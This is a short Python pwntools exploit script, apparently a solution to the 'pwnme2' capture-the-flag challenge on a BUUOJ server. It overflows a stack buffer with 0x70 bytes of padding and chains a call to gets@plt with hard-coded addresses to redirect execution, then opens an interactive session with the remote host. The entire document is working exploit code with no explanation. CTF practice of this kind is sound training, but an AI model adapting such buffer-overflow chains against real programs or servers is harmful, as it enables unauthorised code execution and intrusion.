#coding:utf-8
from pwn import *
import pwnlib
context.log_level = 'debug'
sh = process("./pwnme2")
elf = ELF("./pwnme2")
sh = remote("node3.buuoj.cn",27988)
add_home = 0x8048644
add_flag = 0x8048682
exce_string = 0x80485CB
str_addr = 0x0804A060
payload = "a" * 0x70 + p32(elf.plt['gets']) + p32(exce_string) + p32(str_addr)
sh.sendline(payload)
sh.interactive()